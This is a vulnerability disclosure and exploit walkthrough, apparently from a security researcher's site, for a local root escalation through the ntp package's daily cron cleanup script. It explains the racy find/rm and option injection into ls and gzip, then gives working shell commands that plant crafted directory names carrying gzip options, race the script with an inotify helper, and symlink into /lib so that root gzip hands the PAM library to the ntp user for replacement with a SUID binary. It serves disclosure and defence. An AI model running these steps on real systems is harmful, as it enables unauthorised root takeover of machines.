## Introduction

### Problem description:
The cronjob script bundled with ntp package is intended to perform cleanup on statistics files produced by NTP daemon running with statistics enabled. The script is run as root during the daily cronjobs all operations on the ntp-user controlled statistics directory without switching to user ntp. Thus all steps are performed with root permissions in place.

Due to multiple bugs in the script, a malicious ntp user can make the backup process to overwrite arbitrary files with content controlled by the attacker, thus gaining root privileges. The problematic parts in /etc/cron.daily/ntp are:

find "$statsdir" -type f -mtime +7 -exec rm {} \;

# compress whatever is left to save space
cd "$statsdir"
ls *stats.???????? > /dev/null 2>&1
if [ $? -eq 0 ]; then
  # Note that gzip won't compress the file names that
  # are hard links to the live/current files, so this
  # compresses yesterday and previous, leaving the live
  # log alone.  We supress the warnings gzip issues
  # about not compressing the linked file.
  gzip --best --quiet *stats.???????? 

Relevant targets are:

find and rm invocation is racy, symlinks on rm
rm can be invoked with one attacker controlled option
ls can be invoked with arbitrary number of attacker controlled command line options
gzip can be invoked with arbitrary number of attacker controlled options

##  Methods

### Exploitation Goal: 
A sucessful attack should not be mitigated by symlink security restrictions. Thus the general POSIX/Linux design weakness of missing flags/syscalls for safe opening of path without the setfsuid workaround has to be targeted. See FilesystemRecursionAndSymlinks (http://www.halfdog.net/Security/2010/FilesystemRecursionAndSymlinks/) on that.

### Demonstration: 
First step is to pass the ls check in the script to trigger gzip, which is more suitable to perform file system changes than ls for executing arbitrary code. As this requires passing command line options to gzip which are not valid for ls, content of statsdir has to be modified exactly in between. This can be easily accomplished by preparing suitable entries in /var/lib/ntp and starting one instance of DirModifyInotify.c (http://www.halfdog.net/Misc/Utils/DirModifyInotify.c) as user ntp:

cd /var/lib/ntp
mkdir astats.01234567 bstats.01234567
# Copy away library, we will have to restore it afterwards. Without
# that, login is disabled on console, via SSH, ...
cp -a -- /lib/x86_64-linux-gnu/libpam.so.0.83.1 .
gzip < /lib/x86_64-linux-gnu/libpam.so.0.83.1 > astats.01234567/libpam.so.0.83.1stats.01234567
./DirModifyInotify --Watch bstats.01234567 --WatchCount 5 --MovePath bstats.01234567 --MoveTarget -drfSstats.01234567 &

With just that in place, DirModifyInotify will react to the actions of ls, move the directory and thus trigger recursive decompression in gzip instead of plain compression. While gzip is running, the directory astats.01234567 has to replaced also to make it overwrite arbitrary files as user root. As gzip will attempt to restore uid/gid of compressed file to new uncompressed version, this will just change the ownership of PAM library to ntp user.

./DirModifyInotify --Watch astats.01234567 --WatchCount 12 --MovePath astats.01234567 --MoveTarget disabled --LinkTarget /lib/x86_64-linux-gnu/

After the daily cron jobs were run once, libpam.so.0.83.1 can be temporarily replaced, e.g. to create a SUID binary for escalation.
